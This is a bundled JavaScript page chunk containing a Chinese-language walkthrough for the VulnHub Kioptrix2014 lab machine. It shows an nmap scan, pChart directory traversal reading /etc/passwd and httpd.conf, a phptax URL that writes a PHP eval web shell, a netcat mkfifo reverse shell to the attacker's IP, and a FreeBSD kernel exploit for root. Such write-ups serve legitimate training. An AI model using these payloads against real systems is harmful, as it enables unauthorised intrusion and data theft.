"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[8215],{679:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>t,default:()=>d,frontMatter:()=>i,metadata:()=>s,toc:()=>p});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Kioptrix2014","title":"Kioptrix2014","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/VulnHub/Virtual Machines/Kioptrix2014.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Kioptrix2014","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix2014","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Kioptrix2014.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Kioptrix Level 1","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1"},"next":{"title":"MERCY-v2","permalink":"/docs/VulnHub/Virtual Machines/MERCY-v2"}}');var c=r(4848),a=r(8453);const i={},t=void 0,l={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u7aef\u6e17\u900f",id:"web\u7aef\u6e17\u900f",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Thu Nov  7 09:45:08 2024 as: nmap -sT --min-rate 6000 -p- -oN nmapscan/port_scan 192.168.217.143\r\nNmap scan report for 192.168.217.143\r\nHost is up (0.018s latency).\r\nNot shown: 65532 filtered tcp ports (no-response)\r\nPORT     STATE  SERVICE\r\n22/tcp   closed ssh\r\n80/tcp   open   http\r\n8080/tcp open   http-proxy\r\nMAC Address: 00:0C:29:14:A7:E4 (VMware)\r\n\r\n# Nmap done at Thu Nov  7 09:45:30 2024 -- 1 IP address (1 host up) scanned in 22.09 seconds\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Thu Nov  7 09:52:22 2024 as: nmap -sT -A -p22,80,8080 -oN nmapscan/detils_scan 192.168.217.143\r\nNmap scan report for 192.168.217.143\r\nHost is up (0.00067s latency).\r\n\r\nPORT     STATE  SERVICE VERSION\r\n22/tcp   closed ssh\r\n80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\r\n8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\r\nMAC Address: 00:0C:29:14:A7:E4 (VMware)\r\nDevice type: general purpose\r\nRunning (JUST GUESSING): FreeBSD 9.X|10.X (88%)\r\nOS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10\r\nAggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (88%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 1 hop\r\n\r\nTRACEROUTE\r\nHOP RTT     ADDRESS\r\n1   0.67 ms 192.168.217.143\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u6839\u636e\u626b\u63cf\u7684\u7ed3\u679c\u770b\uff1a\u8fd9\u662f\u4e00\u53f0",(0,c.jsx)(n.code,{children:"FreeBSD"}),"\u7cfb\u7edf"]}),"\n",(0,c.jsx)(n.h3,{id:"web\u7aef\u6e17\u900f",children:"web\u7aef\u6e17\u900f"}),"\n",(0,c.jsx)(n.p,{children:"80\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\uff0c8080\u662f403\uff0c\u5b58\u5728\u8bbf\u95ee\u9650\u5236"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/Kioptrix2014]\r\n\u2514\u2500# curl http://192.168.217.143     \r\n<html>\r\n <head>\r\n  \x3c!--\r\n  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">\r\n  --\x3e\r\n </head>\r\n\r\n <body>\r\n  <h1>It works!</h1>\r\n </body>\r\n</html>\n'})}),"\n",(0,c.jsxs)(n.p,{children:["\u8bbf\u95ee",(0,c.jsx)(n.code,{children:"pChart2.1.3/index.php"})]}),"\n",(0,c.jsx)(n.p,{children:"pchart\u662f\u56fe\u7247\u5de5\u5177\uff0c\u627e\u6f0f\u6d1e\u5c31\u884c\u4e86"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"searchsploit pChart 2.1.3\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8fd9\u91cc\u6709\u4e00\u4e2a\u76ee\u5f55\u7a7f\u8d8a\u7684\u6f0f\u6d1e"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108152257675.png",alt:"image-20241108152257675"})}),"\n",(0,c.jsxs)(n.p,{children:["\u90a3\u5c31\u60f3\u7740\u8bfb",(0,c.jsx)(n.code,{children:"apache"}),"\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u67e5\u770b8080\u7aef\u53e3\u6709\u4ec0\u4e48\u9650\u5236\uff0c\u4e24\u4e2a\u7aef\u53e3\u90fd\u662fapache\u670d\u52a1"]}),"\n",(0,c.jsxs)(n.p,{children:["\u627e\u4e86\u5927\u534a\u5929\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\u90fd\u4e0d\u884c\uff0c\u6700\u540e\u53d1\u73b0\u8fd9\u4e2a\u7cfb\u7edf\u7684\u76ee\u5f55\u8ddf\u4e00\u822c",(0,c.jsx)(n.code,{children:"linux"}),"\u4e0d\u592a\u4e00\u6837"]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108152617588.png",alt:"image-20241108152617588"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.code,{children:"/usr/local/etc/apache22/httpd.conf"})}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"http://192.168.217.143/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f../usr/local/etc/apache22/httpd.conf",children:"http://192.168.217.143/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f../usr/local/etc/apache22/httpd.conf"})}),"\n"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'cat httpd.conf| grep -v "#" | grep -v "^$" > httpd_new.conf\n'})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:'</IfModule>\r\nSetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser\r\n<VirtualHost *:8080>\r\n    DocumentRoot /usr/local/www/apache22/data2\r\n<Directory "/usr/local/www/apache22/data2">\r\n    Options Indexes FollowSymLinks\r\n    AllowOverride All\r\n    Order allow,deny\r\n    Allow from env=Mozilla4_browser\r\n</Directory\n'})}),"\n",(0,c.jsxs)(n.p,{children:["8080\u53ea\u5141\u8bb8UA\u662f",(0,c.jsx)(n.code,{children:"Mozilla/4.0"}),"\u5f00\u5934\u7684\u8bbf\u95ee"]}),"\n",(0,c.jsxs)(n.p,{children:["\u662f\u4e00\u4e2a",(0,c.jsx)(n.code,{children:"phptax"})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"searchsploit phptax\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108154302697.png",alt:"image-20241108154302697"})}),"\n",(0,c.jsxs)(n.p,{children:["\u6211\u8fd9\u91cc\u5229\u7528",(0,c.jsx)(n.code,{children:"25849"})]}),"\n",(0,c.jsx)(n.p,{children:"\u5199\u6587\u4ef6"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"http://192.168.217.143:8080/phptax/index.php?field=shell.php&newvalue=%3C%3Fphp%20eval(%24_POST%5Bcmd%5D)%3B%3F%3E\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"http://192.168.217.143:8080/phptax/data/shell.php\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108154814021.png",alt:"image-20241108154814021"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.217.139 1234 >/tmp/f\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u6210\u529f\u62ff\u5230shell"}),"\n",(0,c.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"$ id\r\nuid=80(www) gid=80(www) groups=80(www)\r\n$ whoami\r\nwww\r\n$ uname -a\r\nFreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5229\u7528\u5185\u6838\u63d0\u6743\uff0c\u63d0\u6743\u65b9\u5f0f\u4f18\u5148\u9009\u62e9sudo\uff0csuid\u7b49\uff0c\u5185\u6838\u63d0\u6743\u662f\u6700\u540e\u7684"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"searchsploit FreeBSD 9.0    \n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u6211\u8fd9\u91cc\u7528",(0,c.jsx)(n.code,{children:"26368.c"}),"\u8fdb\u884c\u63d0\u6743"]}),"\n",(0,c.jsx)(n.p,{children:"\u7528\u8681\u5251\u5c06\u6587\u4ef6\u4e0a\u4f20\u4e0a\u53bb\uff0c\u8fdb\u884c\u7f16\u8bd1"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108155425228.png",alt:"image-20241108155425228"})}),"\n",(0,c.jsx)(n.p,{children:"\u6210\u529f\u62ff\u5230root"})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(o,{...e})}):o(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>i,x:()=>t});var s=r(6540);const c={},a=s.createContext(c);function i(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:i(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);